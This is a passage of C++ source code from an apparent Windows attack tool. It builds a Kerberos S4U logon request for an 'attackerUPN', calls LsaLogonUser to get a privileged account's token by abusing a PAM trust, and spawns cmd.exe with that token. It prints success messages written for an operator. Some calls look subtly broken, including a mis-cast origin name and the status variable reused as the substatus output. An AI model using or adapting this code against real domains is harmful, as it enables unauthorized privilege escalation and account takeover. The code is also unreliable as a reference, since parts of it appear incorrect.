        wprintf(L"[-] LsaLookupAuthenticationPackage failed: 0x%08x\n", status);
        LsaClose(lsaHandle);
        return 1;
    }

    // Build the KERB_S4U_LOGON structure
    KERB_S4U_LOGON s4uLogon = {0};
    s4uLogon.MessageType = KerbS4ULogon; // 0x15
    s4uLogon.Flags = 0; // plain S4U2Self

    InitUnicodeString(&s4uLogon.ClientUpn, attackerUPN);
    // The Realm part is optional for S4U2Self; leaving it empty is fine.
    s4uLogon.ClientRealm.Length = 0;
    s4uLogon.ClientRealm.MaximumLength = 0;
    s4uLogon.ClientRealm.Buffer = nullptr;

    // For S4U2Proxy we would set Flags = KERB_S4U_LOGON_FLAG_PROXY and
    // fill TargetName with the SPN. Here we request a token for the privileged
    // account directly, relying on the PAM trust that grants us the right.
    // However, many PAM trusts are configured for any service. If you need a
    // specific SPN, uncomment the following lines:
    /*
    s4uLogon.Flags = KERB_S4U_LOGON_FLAG_PROXY;
    InitUnicodeString(&s4uLogon.TargetName, targetSPN);
    */

    // Prepare buffers for LSA response
    PVOID profileBuffer = nullptr;
    ULONG profileLength = 0;
    LUID logonId = {0};
    HANDLE tokenHandle = nullptr;
    QUOTA_LIMITS quotas = {0};

    // Issue the logon request
    status = LsaLogonUser(
        lsaHandle,
        (SECURITY_STRING*)L"pam_s4u", // Origin name (optional)
        Network,                      // Logon type – Network works for S4U2Self
        authPkgId,
        &s4uLogon,
        (ULONG)sizeof(s4uLogon),
        nullptr,                      // Token groups – not needed
        nullptr,                      // Local groups – not needed
        &profileBuffer,
        &profileLength,
        &logonId,
        &tokenHandle,
        &quotas,
        &status);                     // SubStatus

    if (status != STATUS_SUCCESS)
    {
        wprintf(L"[-] LsaLogonUser failed: 0x%08x (substatus 0x%08x)\n",
                status, (ULONG)status);
        LsaClose(lsaHandle);
        return 1;
    }

    wprintf(L"[+] Privileged token obtained. Spawning cmd.exe...\n");

    // Launch a process with the privileged token
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (!CreateProcessAsUserW(
            tokenHandle,
            nullptr,
            L"c:\\windows\\system32\\cmd.exe",
            nullptr,
            nullptr,
            FALSE,
            CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &si,
            &pi))
    {
        wprintf(L"[-] CreateProcessAsUser failed: %d\n", GetLastError());
        CloseHandle(tokenHandle);
        LsaClose(lsaHandle);
        return 1;
    }

    wprintf(L"[+] cmd.exe launched with PID %lu\n", pi.dwProcessId);

    // Clean‑up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(tokenHandle);
    LsaClose(lsaHandle);
    return 0;
}
